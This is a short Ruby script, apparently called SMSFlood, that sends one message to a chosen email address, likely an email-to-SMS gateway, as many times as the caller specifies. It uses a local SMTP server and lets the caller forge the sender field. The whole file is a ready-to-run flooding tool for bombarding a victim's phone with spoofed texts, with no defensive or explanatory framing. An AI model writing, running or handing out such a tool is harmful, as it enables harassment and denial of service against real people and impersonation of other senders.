#!/usr/bin/env ruby

require 'net/smtp';

class SMSFlood 
	def initialize(email, message, from, limit)
		@email = email;
		@message = message;
		@from = from;
		@limit = limit.to_i;
	end; # end constructor

	def sendMail
		@limit.times {
			Net::SMTP.start('localhost', 25) { |smtp|
				smtp.send_message(@message, @from, @email);			
			}
		}
	end; # end sendMail method
end; # end SMSFlood class


def main
	begin
		email = ARGV[0].dup;
		message = ARGV[1].dup;
		from = ARGV[2].dup;
		limit = ARGV[3].dup;
		s = SMSFlood.new(email, message, from, limit);
		s.sendMail;
	rescue
		puts "[!] Usage: #{$0} <email> <message> <from_field> <limit>";
	end;
end;

if (__FILE__ == $0)
	main;
end;
